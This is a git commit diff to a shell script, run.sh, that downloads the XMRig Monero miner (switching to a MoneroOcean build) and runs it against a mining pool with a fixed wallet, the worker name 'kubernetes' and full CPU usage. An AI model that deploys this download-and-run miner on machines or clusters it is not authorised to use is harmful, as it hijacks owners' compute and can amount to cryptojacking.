19c1fb6f2da1992f414751e3b9444e9e71208abb
Anthony Lim <46749119+4nth0nyl1MHC@users.noreply.github.com>
2020-12-16 16:51:17 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,5 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.6.2/xmrig-6.6.2-linux-static-x64.tar.gz
-tar -vxf xmrig-6.6.2-linux-static-x64.tar.gz
+wget https://github.com/MoneroOcean/xmrig/releases/download/v6.6.2-mo1/xmrig-v6.6.2-mo1-lin64-compat.tar.gz
+tar -vxf xmrig-v6.6.2-mo1-lin64-compat.tar.gz
 cd xmrig-6.6.2
 ./xmrig -o gulf.moneroocean.stream:80 -u 4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb -p kubernetes --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
 
